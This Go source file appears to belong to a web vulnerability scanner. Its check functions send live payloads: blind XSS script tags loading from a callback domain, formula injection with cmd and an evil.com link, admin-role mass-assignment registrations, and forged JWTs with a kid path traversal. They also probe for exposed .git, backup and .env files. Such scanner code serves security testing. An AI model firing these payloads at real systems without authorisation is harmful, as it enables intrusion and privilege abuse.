package scanner

import (
	"encoding/base64"
	"fmt"
	"net"
	"net/url"
	"regexp"
	"strings"
	"sync"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

// --- Blind XSS (callback-based) ---

func scanBlindXSS(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, oobClient *oob.Client) []Finding {
	var findings []Finding
	if oobClient == nil || !oobClient.Active() {
		return findings
	}
	payload := fmt.Sprintf(`"><script src=https://%s/bxss></script>`, oobClient.Domain())

	for _, form := range crawl.Forms {
		data := url.Values{}
		for _, inp := range form.Inputs {
			data.Set(inp.Name, payload)
		}
		h.Post(form.Action, "application/x-www-form-urlencoded", data.Encode())
	}
	// Findings come via OOB callback later
	return findings
}

// --- CSV/Formula Injection ---

func scanCSVInjection(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	csvPayloads := []string{"=CMD('calc')", "=HYPERLINK(\"http://evil.com\")", "+cmd|'/C calc'!A0", "@SUM(1+1)*cmd|'/C calc'!A0"}
	exportKeywords := []string{"export", "download", "csv", "report", "excel"}

	for _, form := range crawl.Forms {
		isExport := false
		for _, kw := range exportKeywords {
			if strings.Contains(strings.ToLower(form.Action), kw) {
				isExport = true
				break
			}
		}
		if !isExport {
			continue
		}
		for _, inp := range form.Inputs {
			data := url.Values{}
			data.Set(inp.Name, csvPayloads[0])
			resp := h.Post(form.Action, "application/x-www-form-urlencoded", data.Encode())
			if resp.Err == nil && resp.StatusCode == 200 && strings.Contains(resp.Body, "=CMD") {
				findings = append(findings, Finding{
					Type: "CSV/Formula Injection", Severity: "medium",
					URL: form.Action, Param: inp.Name, Payload: csvPayloads[0],
					Detail: "Formula payload reflected in export — code execution when opened in Excel",
					Template: "apex-csv-injection",
				})
				break
			}
		}
	}
	return findings
}

// --- Mass Assignment ---

func scanMassAssignmentReal(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}
	base := extractBaseURL(crawl.Pages[0].URL)

	// Try adding admin/role fields to registration and profile update endpoints
	regPaths := []string{"/register", "/signup", "/api/register", "/api/v1/register", "/api/users"}
	dangerousFields := []string{
		`"role":"admin"`, `"is_admin":true`, `"admin":true`,
		`"role_id":1`, `"permissions":"all"`, `"verified":true`,
		`"balance":99999`, `"credits":99999`, `"plan":"enterprise"`,
	}

	for _, path := range regPaths {
		for _, field := range dangerousFields {
			body := fmt.Sprintf(`{"email":"massassign%d@test.com","password":"Test123!","username":"masstest",%s}`, len(field), field)
			resp := h.Post(base+path, "application/json", body)
			if resp.Err != nil || resp.StatusCode >= 400 {
				continue
			}
			if strings.Contains(resp.Body, "admin") || strings.Contains(resp.Body, "enterprise") || strings.Contains(resp.Body, "99999") {
				findings = append(findings, Finding{
					Type: "Mass Assignment", Severity: "critical",
					URL: base + path, Payload: field,
					Detail: fmt.Sprintf("Server accepted privileged field: %s", field),
					Template: "apex-mass-assignment",
				})
				return findings
			}
		}
	}
	return findings
}

// --- Exposed Databases ---

func scanExposedDatabases(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}
	domain := extractDomain(extractBaseURL(crawl.Pages[0].URL))

	// Check common database ports
	dbPorts := []struct {
		port    string
		service string
		detect  string
	}{
		{"27017", "MongoDB", ""},
		{"6379", "Redis", "REDIS"},
		{"9200", "Elasticsearch", "cluster_name"},
		{"5984", "CouchDB", "couchdb"},
		{"8529", "ArangoDB", "arango"},
		{"7474", "Neo4j", "neo4j"},
		{"15672", "RabbitMQ", "rabbitmq"},
		{"11211", "Memcached", ""},
	}

	for _, db := range dbPorts {
		// Try HTTP connection
		dbURL := fmt.Sprintf("http://%s:%s/", domain, db.port)
		resp := h.Get(dbURL)
		if resp.Err != nil {
			continue
		}
		if resp.StatusCode == 200 && (db.detect == "" || strings.Contains(resp.Body, db.detect)) {
			findings = append(findings, Finding{
				Type: fmt.Sprintf("Exposed %s", db.service), Severity: "critical",
				URL: dbURL, Detail: fmt.Sprintf("%s accessible on port %s without authentication", db.service, db.port),
				Template: "apex-exposed-db",
			})
		}
	}
	return findings
}

// --- .git Directory Download ---

func scanGitExposure(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}

	seen := make(map[string]bool)
	for _, page := range crawl.Pages[:min(5, len(crawl.Pages))] {
		base := extractBaseURL(page.URL)
		if seen[base] {
			continue
		}
		seen[base] = true

		// Check .git/HEAD
		resp := h.Get(base + "/.git/HEAD")
		if resp.Err != nil || resp.StatusCode != 200 {
			continue
		}
		if strings.Contains(resp.Body, "ref: refs/") {
			// Confirmed .git exposure — try to get config for more info
			configResp := h.Get(base + "/.git/config")
			evidence := "ref: refs/heads/main"
			if configResp.Err == nil && strings.Contains(configResp.Body, "[remote") {
				evidence = configResp.Body[:min(200, len(configResp.Body))]
			}
			findings = append(findings, Finding{
				Type: ".git Directory Exposed", Severity: "critical",
				URL: base + "/.git/HEAD", Detail: "Full source code downloadable via exposed .git directory",
				Evidence: evidence, Template: "apex-git-exposed",
			})
		}
	}
	return findings
}

// --- DNS Zone Transfer ---

func scanDNSZoneTransferReal(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}
	domain := extractDomain(extractBaseURL(crawl.Pages[0].URL))

	// Get NS records
	nss, err := net.LookupNS(domain)
	if err != nil || len(nss) == 0 {
		return findings
	}

	// Try AXFR on each nameserver (simplified — just check if port 53 TCP is open and responds)
	for _, ns := range nss {
		conn, err := net.DialTimeout("tcp", ns.Host+":53", 5e9)
		if err != nil {
			continue
		}
		conn.Close()
		// If TCP 53 is open, zone transfer might be possible
		findings = append(findings, Finding{
			Type: "DNS Zone Transfer Possible", Severity: "medium",
			URL: ns.Host, Detail: fmt.Sprintf("Nameserver %s accepts TCP connections on port 53 — test with: dig @%s %s AXFR", ns.Host, ns.Host, domain),
			Template: "apex-zone-transfer",
		})
	}
	return findings
}

// --- JWT kid Header Injection ---

func scanJWTKidInjection(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	jwtRe := jwtRegex()

	for _, page := range crawl.Pages[:min(20, len(crawl.Pages))] {
		resp := h.Get(page.URL)
		if resp.Err != nil {
			continue
		}
		tokens := jwtRe.FindAllString(resp.Body, 3)
		for _, token := range tokens {
			parts := strings.Split(token, ".")
			if len(parts) != 3 {
				continue
			}
			headerJSON, _ := base64.RawURLEncoding.DecodeString(parts[0])
			if !strings.Contains(string(headerJSON), "kid") {
				continue
			}

			// Try kid path traversal — sign with empty key
			// Header: {"alg":"HS256","kid":"../../dev/null"}
			evilHeader := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}`))
			evilToken := evilHeader + "." + parts[1] + "." + forgeJWT(evilHeader, parts[1], "")

			items := []engine.RequestItem{{
				URL: page.URL, Method: "GET",
				Headers: map[string]string{"Authorization": "Bearer " + evilToken},
			}}
			for resp := range h.BatchRequest(items, 1) {
				if resp.Err == nil && resp.StatusCode == 200 {
					findings = append(findings, Finding{
						Type: "JWT kid Path Traversal", Severity: "critical",
						URL: page.URL, Payload: "kid: ../../../../../../dev/null",
						Detail: "JWT kid parameter vulnerable to path traversal — sign with empty file as key",
						Template: "apex-jwt-kid",
					})
					return findings
				}
			}
		}
	}
	return findings
}

// --- Reverse Tabnabbing ---

func scanReverseTabnabbing(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	for _, page := range crawl.Pages[:min(20, len(crawl.Pages))] {
		resp := h.Get(page.URL)
		if resp.Err != nil {
			continue
		}
		// Check for target=_blank without rel=noopener
		if strings.Contains(resp.Body, `target="_blank"`) && !strings.Contains(resp.Body, "noopener") {
			findings = append(findings, Finding{
				Type: "Reverse Tabnabbing", Severity: "low",
				URL: page.URL, Detail: "Links with target=_blank without rel=noopener — opener page can be redirected",
				Template: "apex-tabnabbing",
			})
			break
		}
	}
	return findings
}

// --- LocalStorage Sensitive Data ---

func scanLocalStorageSecrets(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	sensitiveKeys := []string{"token", "jwt", "session", "auth", "password", "secret", "api_key", "access_token", "refresh_token"}

	for _, page := range crawl.Pages[:min(10, len(crawl.Pages))] {
		resp := h.Get(page.URL)
		if resp.Err != nil {
			continue
		}
		for _, key := range sensitiveKeys {
			patterns := []string{
				fmt.Sprintf(`localStorage.setItem("%s"`, key),
				fmt.Sprintf(`localStorage.setItem('%s'`, key),
				fmt.Sprintf(`localStorage["%s"]`, key),
				fmt.Sprintf(`sessionStorage.setItem("%s"`, key),
			}
			for _, p := range patterns {
				if strings.Contains(resp.Body, p) {
					findings = append(findings, Finding{
						Type: "Sensitive Data in LocalStorage", Severity: "medium",
						URL: page.URL, Detail: fmt.Sprintf("Stores '%s' in localStorage — accessible via XSS", key),
						Template: "apex-localstorage",
					})
					break
				}
			}
		}
	}
	return findings
}

// --- Exposed Backup Files ---

func scanBackupFiles(cfg *engine.Config, h *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 20)

	if len(crawl.Pages) == 0 {
		return findings
	}

	seen := make(map[string]bool)
	for _, page := range crawl.Pages[:min(5, len(crawl.Pages))] {
		base := extractBaseURL(page.URL)
		if seen[base] {
			continue
		}
		seen[base] = true

		backupPaths := []string{
			"/backup.zip", "/backup.tar.gz", "/backup.sql", "/db.sql",
			"/site.zip", "/www.zip", "/public.zip", "/html.zip",
			"/database.sql", "/dump.sql", "/data.sql",
			"/.env.bak", "/config.php.bak", "/wp-config.php.bak",
			"/web.config.old", "/.htaccess.bak",
		}

		for _, path := range backupPaths {
			wg.Add(1)
			go func(u string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()
				resp := h.Get(u)
				if resp.Err != nil || resp.StatusCode != 200 || resp.Size < 100 {
					return
				}
				if engine.IsWAFChallenge(resp) {
					return
				}
				// Verify it's actual content, not error page
				ct := resp.Headers.Get("Content-Type")
				if strings.Contains(ct, "zip") || strings.Contains(ct, "sql") || strings.Contains(ct, "octet") || strings.Contains(resp.Body, "CREATE TABLE") || strings.Contains(resp.Body, "INSERT INTO") || strings.Contains(resp.Body, "APP_KEY") {
					mu.Lock()
					findings = append(findings, Finding{
						Type: "Backup File Exposed", Severity: "critical",
						URL: u, Detail: fmt.Sprintf("Backup file accessible (%d bytes, type: %s)", resp.Size, ct),
						Template: "apex-backup-file",
					})
					mu.Unlock()
				}
			}(base + path)
		}
	}
	wg.Wait()
	return findings
}

func jwtRegex() *regexp.Regexp {
	return regexp.MustCompile(`eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`)
}
